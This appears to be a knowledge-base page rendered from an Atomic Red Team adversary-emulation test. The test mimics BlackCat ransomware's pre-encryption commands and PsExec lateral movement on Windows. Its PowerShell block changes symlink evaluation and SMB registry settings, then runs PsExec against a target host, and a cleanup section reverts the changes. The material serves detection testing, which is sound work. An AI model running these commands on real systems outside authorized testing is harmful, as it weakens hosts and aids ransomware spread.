---
atomic_guid: "31eb7828-97d7-4067-9c1e-c6feb85edc4b"
title: "BlackCat pre-encryption cmds with Lateral Movement"
framework: "atomic"
generated: "true"
attack_technique_id: "T1569.002"
attack_technique_name: "System Services: Service Execution"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "31eb7828-97d7-4067-9c1e-c6feb85edc4b"
  - "BlackCat pre-encryption cmds with Lateral Movement"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# BlackCat pre-encryption cmds with Lateral Movement

This atomic attempts to emulate the unique behavior of BlackCat ransomware prior to encryption and during Lateral Movement attempts via PsExec on Windows. Uses bundled PsExec like BlackCat

## Metadata

- Atomic GUID: 31eb7828-97d7-4067-9c1e-c6feb85edc4b
- Technique: T1569.002: System Services: Service Execution
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1569.002/T1569.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1569-system_services|T1569.002]]

## Input Arguments

### targethost

- description: Target hostname to attempt psexec connection to for emulation of lateral movement.
- type: string
- default: $ENV:COMPUTERNAME

## Dependencies

PsExec must exist on disk at "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"

### Prerequisite Check

```text
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") -Force | Out-Null
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
cmd.exe /c "wmic 	csproduct 	get UUID" 
cmd.exe /c "fsutil behavior 	set SymlinkEvaluation R2L:1" 
cmd.exe /c "fsutil behavior set 	SymlinkEvaluation R2R:1"
reg    add    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      
copy "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" $env:temp
cmd.exe /c "$env:temp\psexec.exe  -accepteula  \\#{targethost} cmd.exe  /c echo "--access-token""
```

### Cleanup

```powershell
reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /f
cmd.exe /c "fsutil behavior set SymlinkEvaluation R2L:0" 
cmd.exe /c "fsutil behavior set SymlinkEvaluation R2R:0"
rm $env:temp\psexec.exe
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.yaml)
